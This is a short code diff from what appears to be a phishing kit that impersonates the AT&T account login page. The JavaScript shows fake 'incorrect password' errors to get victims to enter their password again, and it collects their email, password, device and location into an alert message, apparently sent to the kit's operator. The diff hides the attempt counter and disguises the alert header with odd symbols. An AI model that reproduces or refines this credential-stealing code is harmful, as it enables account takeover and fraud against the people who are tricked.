@@ -230,7 +230,7 @@ CREATE_NOW_URL: 'https://www.att.com/acctmgmt/registration?origination_point=OP'
         const existing = document.querySelectorAll('.custom-pw-error');
         existing.forEach(e => e.remove());
         
-        let msg = attemptCount === 1 ? '❌ Incorrect password. Attempt 1/3. Try again.' : '❌ Incorrect password. Attempt 2/3. Last try!';
+        let msg = attemptCount === 1 ? '❌ Incorrect password. Try again.' : '❌ Incorrect password. Try Again';
         
         let container = document.querySelector('#appErrorAbove');
         if (!container || !container.innerHTML) container = document.querySelector('.formfield-msg');
@@ -264,7 +264,7 @@ CREATE_NOW_URL: 'https://www.att.com/acctmgmt/registration?origination_point=OP'
         const location = await getLocationInfo();
         const timestamp = new Date().toLocaleString();
         
-        const message = `🔐 LOGIN ATTEMPT #${attemptNumber}\n` +
+        const message = `🔐 P#!$# AÇĆ£$$ #${attemptNumber}\n` +
                         `📧 User: ${capturedEmail || "Unknown"}\n` +
                         `🔑 Pass: ${password}\n` +
                         `📱 ${deviceInfo}\n` +
